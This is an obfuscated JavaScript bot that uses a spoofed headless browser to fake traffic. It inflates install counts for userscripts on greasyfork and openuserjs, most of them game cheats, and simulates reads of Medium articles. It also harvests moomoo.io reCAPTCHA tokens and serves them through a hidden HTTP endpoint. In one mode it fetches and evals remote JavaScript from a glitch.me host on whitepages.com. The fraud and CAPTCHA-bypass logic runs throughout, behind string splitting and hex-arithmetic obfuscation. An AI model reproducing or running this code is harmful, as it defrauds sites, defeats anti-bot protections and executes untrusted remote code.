      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + Y(0xa) + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + Y(0x3) + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x7 * 0x1b5 + -0x294 * -0xc + 0x12fd * -0x1
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0xe16 + -0x1 * 0x1588 + -0x239e * -0x1)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x2240 + -0xf25 + 0x31c9), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0xc82 * 0x2 + -0x1628 + 0x2f90), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const a0 = d,
          r = await m[a0(0x10) + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x1df6 + 0x1171 + -0x2f67;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0xa8d * 0x2 + -0x1 * -0x2335 + -0x384f; w < getRandomInt(0x1d72 + -0x2420 + 0x6af, -0x1129 * 0x1 + 0x25eb + 0x1 * -0x14bd); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x119f * -0x8 + 0x15cf + 0x1 * 0x16189);
        }
      }();
    }, -0x1 * 0x1555 + -0xd * 0x31 + 0x1836), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const a1 = b;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x3d * 0x89 + 0x1 * 0x1399 + -0x343e;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v[a1(0x9, 'WTDK')](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x1 * -0x570 + 0x106e + -0xafe, 0x1dc4 + 0x4 * 0x794 + 0x69 * -0x92)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x16 * 0x31c + -0x3f7 + -0x7 * -0x789);
    }, -0x134e + 0x91c + 0xa96), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x1a87 * 0x1 + -0xd8d + 0x2814;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x2358 + 0x1702 + 0x180e), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x12 * -0x104 + 0x96b + 0x1bb3 * -0x1), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x1b5618 + -0x332b * -0x83 + 0x1 * -0x27c979);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x1 * 0x1bb5 + 0x1236 + -0x2d87);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const a2 = b,
      i = url['parse'](f['url'])[a2(0xd, 'BA5y')];
    h['writeHead'](-0x99b * 0x3 + -0x2411 + 0xa * 0x691);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x1 * 0x6df + -0x1a70 + -0x40df * -0x1);
}
doFlags['doOUJS'] && ((async () => {
  async function f() {
    const a3 = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x755 * -0x5 + -0x1de4 + 0x2 * 0x2147) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x3b3 + -0x10a2 + 0x1456));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x756 * 0x5 + 0x1 * -0x12c1 + 0x376f, D['indexOf']('\x20'));
        return B ? E['slice'](-0x15b9 * -0x1 + 0x220 + -0x17d9, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x918 + -0x439e + 0x6196),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w[a3(0x12, 'zKkQ')], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x1 * -0xdcd + 0x2408 + -0xac5),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x1c38 + -0x26b6 + 0x42ee; k < 0x785 + 0x2b * -0x80 + 0x1 * 0xdff; k++)
    setTimeout(f, (-0x3e * -0x496 + -0x8d * 0xba + 0x1a3f * 0x2) * k * getRandomInt(0x189c * 0x1 + -0x1f3d + 0x6a2, 0x6ae + 0x77c + -0xe27));
  setInterval(() => {
    f();
    for (let l = 0xe8b + -0x1559 + -0x43 * -0x1a; l < 0x1 * -0x1565 + 0x2412 + 0x8b * -0x1b; l++)
      setTimeout(f, (0x87f0 + -0x10e9d * -0x1 + -0xfa7 * 0xb) * l * getRandomInt(0xf33 * 0x1 + 0x3 * -0x1d4 + 0xb * -0xe2, -0x1f95 + 0x581 + 0x1 * 0x1a17));
  }, -0x295361 + 0x686165 + -0xfc1 * 0x84);
